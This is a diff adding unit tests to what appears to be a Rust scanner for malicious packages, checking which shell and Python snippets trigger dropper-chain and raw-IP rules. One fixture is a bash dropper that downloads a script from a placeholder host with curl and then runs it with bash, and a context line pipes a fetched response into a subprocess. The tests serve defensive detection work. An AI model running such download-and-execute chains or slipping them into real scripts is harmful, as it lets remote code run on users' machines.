@@ -2531,6 +2531,21 @@ mod reconcile {
             \x20   jobs = response.read()\n\
             subprocess.run([sys.executable, helper_script], input=response.read())\n";
         assert_eq!(chained("run.py", handle, "DROPPER-CHAIN-001"), None);
+        // A health check that discards its body to /dev/null, then an
+        // unrelated setup script whose output also goes to /dev/null.
+        let health = "#!/bin/bash\n\
+            curl -fsS -o /dev/null \"https://api.example.com/health\" || exit 1\n\
+            bash \"$SETUP_SCRIPT\" && echo \"setup ok\" >/dev/null\n";
+        assert!(fires("run.sh", health, "CODE-RUNFILE-001"));
+        assert_eq!(chained("run.sh", health, "DROPPER-CHAIN-001"), None);
+        // The same shape writing a real file that is then run is the chain.
+        let dropper = "#!/bin/bash\n\
+            curl -fsSL \"https://get.example.net/i.sh\" -o \"$INSTALLER\"\n\
+            bash \"$INSTALLER\"\n";
+        assert_eq!(
+            chained("run.sh", dropper, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
     }
 
     /// A login helper that opens a credential file for *writing* and then
@@ -2701,6 +2716,11 @@ mod reconcile {
             "EXAMPLE = \"https://203.0.113.7/login\"",
             "DOH = \"https://1.1.1.1/dns-query\"",
             "\"version\": \"1.2.3.4\",",
+            // requests-toolbelt's HostHeaderSSLAdapter docstring (example.com's
+            // address): a documentation example, and the one hit the rule had
+            // on 96 installed clean packages (verifier finding).
+            "        >>> s.get(\"https://93.184.216.34\", headers={\"Host\": \"example.org\"})",
+            "PROXY = \"http://1.2.3.4:3128\"",
         ] {
             assert!(!fires("setup.py", benign, "NET-RAWIP-001"), "{benign}");
             assert!(!fires("setup.py", benign, "INSTALL-RAWIP-001"), "{benign}");
